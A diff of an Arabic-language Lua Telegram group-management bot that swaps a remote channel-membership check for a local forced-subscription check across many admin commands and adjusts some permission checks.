+if text == "قفل التكرار بالطرد" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:hset(bot_id.."LARViN:flooding:settings:"..msg.chat_id_ ,"flood","kick")  
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفل التكرار")
 return false
 end 
-if text == "قفل التكرار" and Addictive(msg) then 
+if text == "قفل التكرار" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:hset(bot_id.."LARViN:flooding:settings:"..msg.chat_id_ ,"flood","del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفل التكرار بالحذف")
 return false
 end 
-if text == "قفل التكرار بالتقيد" and Addictive(msg) then 
+if text == "قفل التكرار بالتقيد" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:hset(bot_id.."LARViN:flooding:settings:"..msg.chat_id_ ,"flood","keed")  
 Reply_Status(msg,msg.sender_user_id_,"lockkid","💢️┇تم قفل التكرار")
 return false
 end 
-if text == "قفل التكرار بالكتم" and Addictive(msg) then 
+if text == "قفل التكرار بالكتم" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:hset(bot_id.."LARViN:flooding:settings:"..msg.chat_id_ ,"flood","mute")  
 Reply_Status(msg,msg.sender_user_id_,"lockktm","💢️┇تم قفل التكرار")
 return false
 end 
-if text == "فتح التكرار" and Addictive(msg) then 
+if text == "فتح التكرار" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:hdel(bot_id.."LARViN:flooding:settings:"..msg.chat_id_ ,"flood")  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح التكرار")
 return false
@@ -1893,29 +2222,83 @@ database:del(bot_id.."LARViN:Basic:Constructor"..msg.chat_id_)
 texts = "✖┇ تم مسح المنشئين الاساسيين"
 send(msg.chat_id_, msg.id_, texts)
 end
-if text == "مسح المنشئين" and BasicConstructor(msg) then
+if text == "مسح المنشئين" and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Constructor"..msg.chat_id_)
 texts = "✖┇ تم مسح المنشئين "
 send(msg.chat_id_, msg.id_, texts)
 end
-if text == "مسح المدراء" and Constructor(msg) then
+if text == "مسح المدراء" and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Manager"..msg.chat_id_)
 texts = "✖┇ تم مسح المدراء "
 send(msg.chat_id_, msg.id_, texts)
 end
-if text == "مسح الادمنيه" and Owner(msg) then
+if text == "مسح الادمنيه" and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Mod:User"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, "🗑┇ تم مسح  قائمة الادمنية  ")
 end
-if text == "مسح المميزين" and Addictive(msg) then
+if text == "مسح المميزين" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Special:User"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, "🗑┇ تم مسح  قائمة الاعضاء المميزين  ")
 end
-if text == "مسح المكتومين" and Addictive(msg) then
+if text == "مسح المكتومين" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Muted:User"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, "🗑┇ تم مسح قائمه المكتومين ")
 end
-if text == "مسح المحظورين" and Addictive(msg) then
+if text == "مسح المحظورين" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Ban:User"..msg.chat_id_)
 send(msg.chat_id_, msg.id_, "\n🚷┇تم مسح المحظورين")
 end
@@ -1969,7 +2352,16 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("المنشئين") and BasicConstructor(msg) then
+if text == ("المنشئين") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:Constructor"..msg.chat_id_)
 t = "\n⛔┇قائمة المنشئين \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
@@ -1985,7 +2377,16 @@ t = "✖┇لا يوجد منشئين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("المدراء") and Constructor(msg) then
+if text == ("المدراء") and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:Manager"..msg.chat_id_)
 t = "\n⛔┇قائمة المدراء \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
@@ -2001,7 +2402,16 @@ t = "✖┇لا يوجد مدراء"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("الادمنيه") and Owner(msg) then
+if text == ("الادمنيه") and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:Mod:User"..msg.chat_id_)
 t = "\n⛔┇قائمة الادمنيه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
@@ -2033,7 +2443,16 @@ t = "✖┇لا يوجد مميزين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == ("المكتومين") and Addictive(msg) then
+if text == ("المكتومين") and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:Muted:User"..msg.chat_id_)
 t = "\n⛔┇قائمة المكتومين \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
@@ -2050,7 +2469,16 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 
-if text == ("المحظورين") and Addictive(msg) then
+if text == ("المحظورين") then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 local list = database:smembers(bot_id.."LARViN:Ban:User"..msg.chat_id_)
 t = "\n⛔┇قائمة محظورين المجموعه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
 for k,v in pairs(list) do
@@ -2210,12 +2638,15 @@ Reply_Status(msg,userid,"reply","💢┇تم تنزيله من المطورين"
 return false 
 end
 
-if text == ("رفع منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == ("رفع منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 function Function_LARViN(extra, result, success)
 database:sadd(bot_id.."LARViN:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
@@ -2224,12 +2655,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^رفع منشئ اساسي @(.*)$") and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع منشئ اساسي @(.*)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^رفع منشئ اساسي @(.*)$")
 function Function_LARViN(extra, result, success)
@@ -2239,7 +2673,7 @@ send(msg.chat_id_,msg.id_,"💢┇عذرا عزيزي المستخدم هاذا 
 return false 
 end      
 database:sadd(bot_id.."LARViN:Basic:Constructor"..msg.chat_id_, result.id_)
-Reply_Status(msg,result.id_,"reply","💢┇تم ترقيته منشئ اساسي")  
+Reply_Status(msg,result.id_,"reply","??┇تم ترقيته منشئ اساسي")  
 else
 send(msg.chat_id_, msg.id_,"💢┇لا يوجد حساب بهاذا المعرف")
 end
@@ -2247,24 +2681,30 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^رفع منشئ اساسي (%d+)$") and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع منشئ اساسي (%d+)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^رفع منشئ اساسي (%d+)$") 
 database:sadd(bot_id.."LARViN:Basic:Constructor"..msg.chat_id_, userid)
 Reply_Status(msg,userid,"reply","💢┇تم ترقيته منشئ اساسي")  
 return false
 end
-if text == ("تنزيل منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == ("تنزيل منشئ اساسي") and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 function Function_LARViN(extra, result, success)
 database:srem(bot_id.."LARViN:Basic:Constructor"..msg.chat_id_, result.sender_user_id_)
@@ -2273,12 +2713,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^تنزيل منشئ اساسي @(.*)$") and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل منشئ اساسي @(.*)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^تنزيل منشئ اساسي @(.*)$")
 function Function_LARViN(extra, result, success)
@@ -2293,12 +2736,15 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 return false
 end
-if text and text:match("^تنزيل منشئ اساسي (%d+)$") and DevBot(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل منشئ اساسي (%d+)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
 database:srem(bot_id.."LARViN:Basic:Constructor"..msg.chat_id_, userid)
@@ -2306,12 +2752,15 @@ Reply_Status(msg,userid,"reply","💢┇تم تنزيله من المنشئين"
 return false
 end
 
-if text == "رفع منشئ" and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == "رفع منشئ" and tonumber(msg.reply_to_message_id_) ~= 0 and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 function Function_LARViN(extra, result, success)
 database:sadd(bot_id.."LARViN:Constructor"..msg.chat_id_, result.sender_user_id_)
@@ -2319,12 +2768,15 @@ Reply_Status(msg,result.sender_user_id_,"reply","💢┇تم ترقيته منش
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 end
-if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^رفع منشئ @(.*)$")
 function Function_LARViN(extra, result, success)
@@ -2342,12 +2794,15 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 end
 ------------------------------------------------------------------------
-if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^رفع منشئ (%d+)$")
 database:sadd(bot_id.."LARViN:Constructor"..msg.chat_id_, userid)
@@ -2361,12 +2816,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 end
 ------------------------------------------------------------------------
-if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^تنزيل منشئ @(.*)$")
 function Function_LARViN(extra, result, success)
@@ -2380,24 +2838,30 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN, nil)
 end
 ------------------------------------------------------------------------
-if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^تنزيل منشئ (%d+)$")
 database:srem(bot_id.."LARViN:Constructor"..msg.chat_id_, userid)
 Reply_Status(msg,userid,"reply","💢┇تم تنزيله من المنشئين")  
 end
 
-if text == ("رفع مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text == ("رفع مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 function Function_LARViN(extra, result, success)
 database:sadd(bot_id.."LARViN:Manager"..msg.chat_id_, result.sender_user_id_)
@@ -2406,12 +2870,15 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LARViN, nil)
 return false
 end  
-if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local username = text:match("^رفع مدير @(.*)$") 
 function Function_LARViN(extra, result, success)
@@ -2430,24 +2897,30 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LARViN,
 return false
 end 
 
-if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
-send(msg.chat_id_,msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• [@Source_Milano] ⚜️')   
-return false 
+if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 local userid = text:match("^رفع مدير (%d+)$") 
 database:sadd(bot_id.."LARViN:Manager"..msg.chat_id_, userid)
 Reply_Status(msg,userid,"reply","💢┇تم ترقيته مدير المجموعه")  
 return false
 end  
-if text == ("تنزيل مدير") and tonumber(msg.reply_to_message_id_) ~= 0 and Constructor(msg) then 
-local url,res = http.request('http://LARViN.ml/joinch/?id='..msg.sender_user_id_)
-data = JSON.decode(url)
-if data.Ch_Member.LARViN == 0 then
